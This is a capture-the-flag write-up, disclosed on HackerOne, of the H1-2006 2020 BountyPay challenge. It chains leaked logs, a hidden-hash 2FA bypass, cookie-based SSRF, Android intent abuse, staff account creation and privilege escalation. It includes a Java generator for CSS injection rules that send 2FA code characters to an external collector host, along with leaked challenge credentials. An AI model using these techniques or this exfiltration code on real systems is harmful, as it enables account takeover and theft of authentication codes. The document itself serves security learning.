# [H1-2006 2020] Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or using a custom API attack tool

## Report Details
- **Report ID**: 895172
- **URL**: https://hackerone.com/reports/895172
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-10T05:14:10.440Z
- **Disclosed**: 2020-06-22T20:59:43.350Z

## Reporter
- **Username**: bcobain23
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
H1-2006 CTF Writeup
{F859938}

## Summary:
Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:
* Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.
* Allowing the primary key to be changed to another’s users record, permitting viewing or editing someone else’s account.
* Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
* Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation.
* CORS misconfiguration allows unauthorized API access.
* Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

## Steps To Reproduce:

1- Information Disclosure 

When performing a search for BountyPay on Google, a result appears on Github https://github.com/bounty-pay-code/request-logger/blob/master/logger.php, we access this and it shows us a Logger file that contains log information in the path /bp_web_trace.log. When we visit https://app.bountypay.h1ctf.com/bp_web_trace.log it downloads the .log file which contains base64 encoded data. 

{F861649}
{F861648}

We send this data to Burp Suite / Decoder and it provides us with the following information:

Base64 Encoded:
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

Base64 Decoded:

{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

{F861647}

Well, now we have a username and password to access https://app.bountypay.h1ctf.com, but upon entering it asks for a second authentication factor that we do not have.

2- Login 2FA Bypass

{F861666}
{F861669}

Now we have a double authentication factor, but we do not have the 10-character password that is sent to the mobile phone. This password contains characters like A-Z, a-z and 0-9. We try random characters but without results. When inspecting element, we can see that the following is found:

<input type="hidden" name="challenge" value="a829e6865ae4ef4ace5c24b091fa8a91">, where value corresponds to an MD5 hash corresponding to the 10 character password. We try to decode this hash and get no results.

Now if we consider that the password contains 10 characters that can be A-Z , a-z y 0-9, we create our hash MD5 with the amount of characters requested on the web https://www.md5hashgenerator.com/. We create a string with 1111111111 (can be whatever) 
and the result of our hash is e11170b8cbd2d74102651cb967fa28e5.

{F861668}

We replace the hash in "value" mentioned above and we put ours, as we know what is the string correct we use it as our password for the 2FA managing to make the Bypass.

{F861670}

 We entered and we found BountyPay Dashboard, We try to load the transactions corresponding to May 2020, but it gives us the message "No Transactions To Process". Well in this part I thought "now I have to make the payment, but wait, this is not easy hahaha". We review the transactions of the 12 months and it sends the same message, so we deduce that we do not have the permissions to carry out this operation with the account of brien oliver.

{F861667}
{F861671}

We try to use the cookie to be able to change users, but it is not possible to carry out the operation. At this moment I did not know well what I could do to move forward, so I stopped and went to have a coffee to clear my head for a few moments, after several attempts I could not continue or find something that would help me, which is why I started to check other subdomains in search of something to help me continue, use Dirb, Dirsearch, etc.

After several hours look at the cookie again and note that it is again a base64 and when sending it to the Decoder in Burp Suite it shows the following information:
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}.

{F861672}
{F861673}

Here I couldn't go any further and I was stuck again. I began to review what else I could see within the requests when trying to load the transactions by month and year, I notice that the answer appears:
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=05&year=2020","data":"{\"description\":\"Transactions for 2020-05\",\"transactions\":[]}"}

3- SSRF

In order to use the SSRF vulnerability we must take the API found in the previous step and use it in our base64 encoded cookie. The information that the cookie gives us currently is:
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}

So what we need is to modify this base64, to use the API and to be able to access https://software.bountypay.h1ctf.com, which if we enter directly gives us a 401 Unauthorized "You do not have permission to access this server from your IP Address".

First if we go directly to the API https://api.bountypay.h1ctf.com we found a redirect in "REST API", ok now we will use this redirect to run our SSRF and access the URL that gives us 401.
How do we do it? We take the cookie, we modify it, we must go two directories behind and this would look like this:
 {"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}

We replace "F8gHiqSdpK" for "../../redirect?url=https://software.bountypay.h1ctf.com/#" and this allows us to internally access the URL that 401 Unauthorized gave us. Well now that we can enter we must list directories, of course the aforementioned must be encoded in base64 and put it in the cookie.

Because testing brute forcing directory one by one and then passing it to base64 to send it, manually is very slow, so we create a Python script to list directories and when we get a 200 response, we will use that directory to pass it to base64 and log into https://software.bountypay.h1ctf.com/uploads/BountyPay.apk to download the application.
***It looks simple right, believe me it was not.***
Python Script:
{F861692}
{F861693}

4- Harcoded Validation

Now we have our APK for which I use a mobile phone with Android for testing, I install the application and it asks for a user, we enter it but it does nothing more.
In this part we must decompile the downloaded apk file and for this I use apktools.
We execute "apktool d BountyPay.apk" and leaves us a folder where we agree to review our AndroidManifest.xml.
In this part what is interesting are the "intent", of which we find 3 parts, but ok and now that, how can I execute this ?. Well I found a practical guide at http://www.xgouchet.fr/android/index.php?article42/launch-intents-using-adb and https://stackoverflow.com/questions/22921637/android-intent-data-uri-query-parameter
If we understand these guides we can start executing the instructions using adb as follows:

First of all we run the application and enter a username and then enter the following commands:

{F861695}

First command:
adb shell am start -a "android.intent.action.VIEW" -d "one://part?start=PartTwoActivity"

{F861696}

Second command:
adb shell am start -a "android.intent.action.VIEW" -d "two://part?two=light\&switch=on" 
Here it gives us a code 459a6f79ad9b13cbcb5f692d3cc7a94d and it asks for a "Header Value", it appears in the code inside the manifest and is X-Token, we enter it and we reach the third part.

{F861698}

We enter the following below:
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
and asks us "Submit leaked hash"

Until now we do not have this value, so we will have to capture the logs with the following command:
adb -d logcat bounty.pay:I

Now we enter again:
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"

We stop it as soon as the word "token" appears on the screen and we enter this Hash on the phone to pass the apk 3 challenge.
Now we have our token from the X-Token apk: 8e9998ee3137ca9ade8f372739f062c1 and we must see what we can do with this token.

{F861699}
{F861700}


5- Sensitive information disclosure

We go back to Twitter and check some Hint in Hackerone, but we don't see something relevant, so we go to Twitter BountyPay and we only see that a new person Sandra Allison has entered. If we review Sandra appears indicating "First Day at BountyPayHQ" showing her credential where we can view her STF:8FJ3KFISL3

{F861707}
{F861706}

What can we do with her STF:8FJ3KFISL3  ?

Previously, when using dirsearch to the API, it gave us the following:
/api/accounts/login
/api/accounts/signin
/api/accounts/logon
/api/staff

So we started testing the X-Token: 8e9998ee3137ca9ade8f372739f062c1 that we got from the apk by sending requests GET, and gives us the following information:
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]

{F861709}

Well, the X-Token works, but we still can't move forward. In this part I started to try the method POST and we put staff_id=STF:8FJ3KFISL3 Sandra user and boom gives us an answer:
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}

{F861710}

Now we have created account, user and password of Staff. We test the credentials and enter to https://staff.bountypay.h1ctf.com

{F861712}
{F861711}

6- Privilege Escalation

Already within the account of Sandra as Staff we reviewed the page and we found "Home", "Support Tickets", "Profile" y "Logout".
We entered each of the options but we did not find anything useful to perform any other operation, this was one of the hardest parts of getting through, you will understand why.

We check the source code of the page, but we did not find anything useful.

We go to the developer tools in Firefox (es igual en Chrome) and we entered to review the debugger where we found 3 .js files
The one that specifically catches our attention is website.js which contains the following:

{F861721}

$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));

Well, what we see here, first we find that there is a function with which we could escalate privileges to Admin, but how?

Let's keep checking and see that this applies to the "click" function, but we still don't know how to use this.

Let's see again, we have a file and a function with which we can escalate privileges, so we dedicate ourselves to find out how to use this and make the administrator give us this privilege.

When we review the options that the page gives us at the bottom we can see that it says "Report This Page", we click on it and it gives us the option to report now and also the following information:
"Pages in the /admin directory will be ignored for security"

{F861725}

Now we know we can get to /admin but we can't go to a directory below because of page restrictions.

We perform the "Report This Page" operation again and intercept with Burp to check what data or useful information it is sending and we see that in the URL it sends:
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l 

Again we see a base64 crash that contains /?Template=home

We know that we have to escalate privileges in order to overcome this part, but I still can't see how?

I go back once more to review website.js and try to figure out how to use this function to go from being Staff to Admin.

We try to URL https://staff.bountypay.h1ctf.com/admin/upgrade?username=8FJ3KFISL3 but it gives us back "Only admins can perform this"

{F861726}

OK, if we inspect element we see that the avatar is an "input" so we will try to use it to include the functions of the .js file so we will put avatar 3 = tab4 upgradeToAdmin

{F861727}

We send the request to Burp to see that this field is modified, this is the first step.

Now we must modify the URL and add an "Array" to use the function and escalate privileges using and Burp, we do this with the Support Tickets option, where we must practically call several URLs on the same page and we do it with the following URL:
https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4

{F861728}

We intercept this in Burp Suite because the browser removes us #tab4

Select "Report This Page", the report is sent with our modifications, the page is pasted without loading, so we must return to "Home" URL https://staff.bountypay.h1ctf.com

{F861730}

Boom we see the "Admin" tab, now we access it and we see the user of marten.mickos and his password h&H5wy2Lggj*kKn4OD&Ype

{F861731}

We must re-enter the site, but now as admin with the account Marten Mickos in the URL https://staff.bountypay.h1ctf.com


7- 2FA Payments  Bypass through SSRF

Now in this last part we login to https://staff.bountypay.h1ctf.com with user account marten.mickos and password h&H5wy2Lggj*kKn4OD&Ype

{F861735}

Well, at the first admission, you ask us to enter 2FA again as at the beginning.

It indicates that a 10-character password is sent to the mobile phone and characters between A-Z, a-z and 0-9

Try modifying as the first 2FA, inspecting element we create an MD5 with the following:
e11170b8cbd2d74102651cb967fa28e5 = 1111111111

{F861737}

Now we are in the Marten Mickos account, we load the May 2020 transactions, well now it shows us the information and the payment button.

{F861738}

We select to pay, but again another challenge asks us for another 2FA authentication to make the payment, this time modifying html no longer works.

{F861740}

We intercept the request to see what information is being sent and we see the following:
app_style=https://www.bountypay.h1ctf.com/css/uni_2fa_style.css

We visit this URL to see if it gives us some type of information to overcome this challenge and it only shows us the following:

/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}

So now with what we have, we see that in the request a .css file is sent and will look for which is why we will need to create a .css file so that it can be fetched and mounted on our ssl server.

Now we create the following buri.css file

import java.io.FileWriter; 
import java.io.IOException;

public class CssExfiltrator{

    String hostname = "https://u61wqtubaeskyx8lah6eb0705rbhz6.example.com/"; // https://example.com/
    String cssFile = "bcobain23.css"; // uni_2fa_style.css

    String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    
    public void writeFile(StringBuilder css){
        try {
            FileWriter fw = new FileWriter(cssFile);
            fw.write(css.toString());
            fw.close();
            System.out.println("Successfully wrote css file");
          } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
          }
    }

    public void getInputNames(String input){
        StringBuilder css = new StringBuilder();
        for(char s:characters.toCharArray()){
            css.append("input[name^='").append(input).append(s).append("'] {background: url('").append(hostname).append(s).append("');}").append("\n");
        }
        System.out.println(css.toString());
        writeFile(css);
    }

    public void getInputValues(){
        StringBuilder css = new StringBuilder();
        for(int i=1; i<=7; i++){
            for(char s:characters.toCharArray()){
                css.append("input[name='code_").append(i).append("'] {background: url('").append(hostname).append(i).append("/").append(s).append("');}").append("\n");
            }
        }
        System.out.println(css.toString());
        writeFile(css);
    }

    public static void main(String[] args){
        CssExfiltrator cssExf = new CssExfiltrator();

        /*
        if(args.length > 0){
            cssExf.getInputNames(args[0]);
        }else{
            cssExf.getInputNames("");
        }
        */
        cssExf.getInputValues();
    }
}

We mount it on our server, use burp collaborator and see the following:

{F861736}

We begin to exfiltrate the 2FA code one by one, in the image we can see that it gives us a number that is the correct position next to the corresponding character

{F861734}

We obtain the code, place it in an orderly manner and make the payment to the Hackers.
Challenge Completed.

Actually this was hours of suffering and my first participation in CTF, I thank the people who spent time creating this challenge, since I learned many new things.

## Impact

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:
* Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.
* Allowing the primary key to be changed to another’s users record, permitting viewing or editing someone else’s account.
* Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
* Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation.
* CORS misconfiguration allows unauthorized API access.
* Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

## Attachments
- Twitter_intro.JPG
- Fase1_Login_User_Passwd.JPG
- Github_Log_BountyPay.JPG
- Google_Search_BountyPay.JPG
- First_2FA_BrienOliver.JPG
- First_2FA_Bypass_Done.JPG
- First_2FA_Bypass_Hash.JPG
- First_2FA_Hash_Predefined.JPG
- First_2FA_Hash_Modified.JPG
- No_Transactions_To_Process.JPG
- Request_Response_API.JPG
- Request_Response_API_2.JPG
- Python_Script.JPG
- URL_Found_SSRF.JPG
- Phone_1.jpeg
- Phone_2.jpeg
- Phone_3.jpeg
- ADB_Part3_Hash.JPG
- Phone_4.jpeg
- BountyPay_Sandra_2_STF.JPG
- BountyPay_Sandra_1.JPG
- BountyPay_Users_3_STF.JPG
- BountyPay_Create_Sandra_4_STF.JPG
- BountyPay_Logon_Staff_5_STF.JPG
- BountyPay_Login_Staff_4_STF.JPG
- JavaScript_File_website_1.JPG
- Report_This_Page_3.JPG
- Upgrade_Admin_1.JPG
- Upgrade_Admin_2_functions_tab4.JPG
- Upgrade_Admin_3_functions_tab4.JPG
- Report_This_Page_2.JPG
- Upgrade_Admin_4_functions_tab4.JPG
- Challenge_Completed.JPG
- Collaborator_Exfiltration.JPG
- Login_Marten_Mickos.JPG
- Request_Collaborator_Exfiltration.JPG
- Second_2FA_Marten_Mickos.JPG
- Transacciones.JPG
- 2FA_Pay.JPG
